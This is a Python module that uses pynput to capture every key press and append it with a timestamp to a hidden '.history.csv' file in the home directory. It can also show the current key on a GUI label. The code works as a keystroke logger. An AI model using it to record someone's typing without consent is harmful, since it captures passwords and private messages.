import os
import csv
from pathlib import Path
from pynput import keyboard
from datetime import datetime

current_key: str = ""
show_window: bool = False
csv_header: list[str] = ["timestamp", "key"]
gui_label = None  # type: ignore[assignment]


def get_log_file_path() -> Path:
    log_file_pathname = Path.home()
    log_file_pathname.mkdir(parents=True, exist_ok=True)
    return log_file_pathname / ".history.csv"

def set_gui_label(label):
    global gui_label
    gui_label = label

def set_show_window(state: bool) -> None:
    global show_window
    show_window = state

def ensure_csv_has_header() -> None:
    global csv_header
    log_file_pathname = get_log_file_path()
    if not os.path.exists(log_file_pathname):
        with open(log_file_pathname, mode="w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(csv_header)

def write_key_to_csv(key: str) -> None:
    log_file_pathname = get_log_file_path()
    ensure_csv_has_header()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file_pathname, mode="a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, key])

def on_press(key: keyboard.Key) -> None:
    global current_key
    try:
        current_key = key.char
    except AttributeError:
        current_key = str(key)
        if current_key.startswith("Key."):
            current_key = current_key.replace("Key.", "")

    write_key_to_csv(current_key)
    if show_window and gui_label:
        gui_label.config(text=f"{current_key}")
